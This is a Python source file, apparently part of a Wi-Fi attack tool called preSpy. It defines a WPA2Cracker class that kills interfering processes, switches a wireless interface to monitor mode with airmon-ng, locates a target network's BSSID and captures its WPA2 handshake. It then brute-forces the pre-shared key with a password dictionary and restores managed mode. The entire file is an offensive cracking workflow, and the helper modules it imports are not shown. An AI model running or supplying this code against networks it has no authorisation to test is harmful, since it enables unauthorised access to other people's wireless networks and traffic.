from preSpy.BssidFinder import *
from preSpy.HandshakeGrabber import *
from preSpy.PSKFinder import *

class WPA2Cracker:
    def __init__(self, interface, ssid, dictPath):
        self.attackFailed = False
        self.interface = interface
        self.bssidFinder = BssidFinder(self.interface, ssid)
        self.handshakeGrabber = HandshakeGrabber(self.interface)
        self.PSKFinder = PSKFinder(dictPath)

    def setMonitorMode(self):
        try:
            os.system("sudo airmon-ng check kill")
            os.system(f"sudo airmon-ng start {self.interface}")
        except Exception as e:
            self.attackFailed = True
            print(e)

    def setManagedMode(self):
        try:
            os.system(f"sudo airmon-ng stop {self.interface}")
            os.system("sudo systemctl start NetworkManager")
        except Exception as e:
            print(e)
    def findBssid(self):
        self.attackFailed = self.bssidFinder.run()

    def getHandshake(self):
        self.handshakeGrabber.bssid = self.bssidFinder.bssid
        self.attackFailed = self.handshakeGrabber.run(self.bssidFinder.apChannel)

    def bruteForceMic(self):
        self.PSKFinder.ssid = self.bssidFinder.ssid
        self.PSKFinder.handshake = self.handshakeGrabber.handshake
        self.attackFailed = self.PSKFinder.run()